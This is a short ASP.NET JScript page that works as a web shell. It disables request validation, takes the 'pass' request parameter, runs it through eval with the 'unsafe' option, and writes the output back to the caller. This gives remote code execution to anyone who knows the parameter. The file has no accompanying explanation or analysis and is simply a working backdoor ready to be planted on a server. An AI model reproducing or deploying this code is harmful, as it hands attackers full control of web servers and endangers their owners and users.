<%@ Page Language="Jscript" validateRequest="false" %>
<%
function xxxx(str)
{
        return eval(str,"unsafe");
}
%>
<%var a = Request.Item["pass"];%>
<%var b = xxxx(a);%>
<%Response.Write(b);%>